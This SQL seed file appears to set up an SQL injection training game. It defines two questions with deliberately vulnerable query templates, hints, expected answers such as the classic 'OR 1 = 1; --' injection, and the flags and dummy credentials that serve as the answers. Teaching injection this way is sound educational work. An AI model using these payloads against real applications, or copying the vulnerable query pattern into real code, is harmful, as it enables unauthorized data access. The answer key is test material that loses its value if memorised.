-- q1 question
INSERT INTO questions (id, query, answer, hints) 
VALUES (
    'q1', 
    'SELECT flag FROM q1secrets WHERE question_id = ''$1'';',
    'test'' OR 1 = 1; -- ',
    ARRAY [
        'Your injection comes after an opened '', close it off then proceed with an OR clause.', 
        'Choose something after your OR clause that will always be true.',
        'After your input there still might be some code, try commenting it out.'
    ]
);

-- q1 answer
INSERT INTO q1secrets (question_id, flag)
VALUES ('asdfasdfa;lsdflkj!@#$%^&*', 
    'SQLI_GUIDE{H1_TH3R3_7H1S_1S_FL3G_QU3S710N_0NE}'
);

-- q2
INSERT INTO questions (id, query, answer, hints) 
VALUES (
    'q2',
    'SELECT flag FROM q2secrets WHERE username = ''$1'' and password = ''$2'';',
    'test'' OR 1 = 1; --, pass',
    ARRAY [
        'Think about how you can manipulate either username or password to always be true.', 
        'You must also bypass the AND clause here, in SQL AND takes precedence over OR clauses.', 
        'When using SQL single quotation marks are used for string literals.'
    ]
);

-- q2 answer
INSERT INTO q2secrets (flag, username, password)
VALUES ('SQLI_GUIDE{MUH1H11H1_F7A6_f04_Q2_L4L}',
    'thisissohard',
    'youwillnevercrackthis'
);